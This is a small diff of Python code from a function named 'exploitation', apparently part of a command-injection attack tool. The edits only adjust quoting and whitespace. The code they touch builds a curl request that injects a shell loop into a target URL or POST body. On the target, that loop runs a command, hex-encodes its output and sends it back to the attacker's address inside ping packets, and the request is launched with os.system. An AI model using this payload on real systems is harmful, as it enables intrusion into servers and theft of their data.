@@ -66,13 +66,13 @@ def exploitation(ip_dst,ip_src,url,http_request_method,request_data):
 	  
 	else:
 	  if http_request_method == "GET":
-	    payload = ('curl "'+ url + 
+	    payload = ('curl \"'+ url + 
 		      '; for i in \$(' + cmd + 
 		      ' | xxd -ps -c8); do ping ' + ip_src + 
-		      ' -c1 -s16 -p \$i ; done"' + 
-		      '-s >/dev/null 2>&1'
+		      ' -c1 -s16 -p \$i ; done\"' + 
+		      ' -s >/dev/null 2>&1'
 		      )
-
+	    
 	  else:
 	    payload = ('curl ' + url  + ' --data \"'+ request_data +'' +
 		      '; for i in \$(' + cmd + 
@@ -85,6 +85,7 @@ def exploitation(ip_dst,ip_src,url,http_request_method,request_data):
 	os.system(payload) 
 	time.sleep(1)
 	sys.stdout.write("\n" + colors.RESET)
+	
       except:
 	print ""
 	os._exit(0)
